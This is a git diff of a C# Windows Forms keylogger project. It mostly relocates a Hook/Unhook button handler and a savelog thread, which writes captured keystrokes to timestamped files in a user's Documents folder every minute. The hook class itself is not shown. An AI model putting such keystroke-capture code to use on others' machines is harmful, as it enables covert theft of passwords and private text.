@@ -19,16 +19,54 @@ namespace Windows_KeyLogger
     {
         public KeyboardHook hooker = null;
         public Boolean isHooking = false;
-
         public Dictionary<Keys, String> dicUpper;
         public Dictionary<Keys, String> dicLower;
         public Dictionary<Keys, String> dicNumpad;
         public Dictionary<Keys, String> dicFunc;
+
         public Form1()
         {
             InitializeComponent();
             hooker = new KeyboardHook(this);
             InitDictionary();
+        }
+
+
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Button btn = (Button)sender;
+            isHooking = !isHooking;
+            if (isHooking)
+            {
+                hooker.hook();
+                btn.Text = "Unhook";
+                Thread thread = new Thread(savelog);
+                thread.Start();
+            }
+            else
+            {
+                hooker.unhook();
+                btn.Text = "Hook";
+            }
+
+        }
+
+        public void savelog()
+        {
+            while (isHooking)
+            {
+                Thread.Sleep(60000);
+                String strFileName = "C:\\Users\\waps12b\\Documents\\log_" + DateTime.Now.ToString("yyyyMMdd HHmmss") + ".txt";
+                StreamWriter fsw = new StreamWriter(File.Open(strFileName, FileMode.Create));
+                fsw.Write(richLog.ToString());
+                fsw.Close();
+            }
+        }
+
+        private void richLog_TextChanged(object sender, EventArgs e)
+        {
+            richLog.ScrollToCaret();
         }
 
         private void InitDictionary()
@@ -122,42 +160,6 @@ namespace Windows_KeyLogger
             dicLower[Keys.Subtract] = dicUpper[Keys.Subtract] = "-";
             dicLower[Keys.Multiply] = dicUpper[Keys.Multiply] = "*";
             dicLower[Keys.Decimal] = dicUpper[Keys.Decimal] = ".";
-        }
-
-        private void button1_Click(object sender, EventArgs e)
-        {
-            Button btn = (Button)sender;
-            isHooking = !isHooking;
-            if(isHooking)
-            {
-                hooker.hook();
-                btn.Text = "Unhook";
-                Thread thread = new Thread(savelog);
-                thread.Start();
-            }
-            else
-            {
-                hooker.unhook();
-                btn.Text = "Hook";
-            }
-           
-        }
-
-        public void savelog()
-        {
-            while(isHooking)
-            {
-                Thread.Sleep(60000);
-                String strFileName = "C:\\Users\\waps12b\\Documents\\log_" + DateTime.Now.ToString("yyyyMMdd HHmmss") + ".txt";
-                StreamWriter fsw = new StreamWriter(File.Open(strFileName, FileMode.Create));
-                fsw.Write(richLog.ToString());
-                fsw.Close();
-            }
-        }
-
-        private void richLog_TextChanged(object sender, EventArgs e)
-        {
-            richLog.ScrollToCaret();
         }
     }
 }
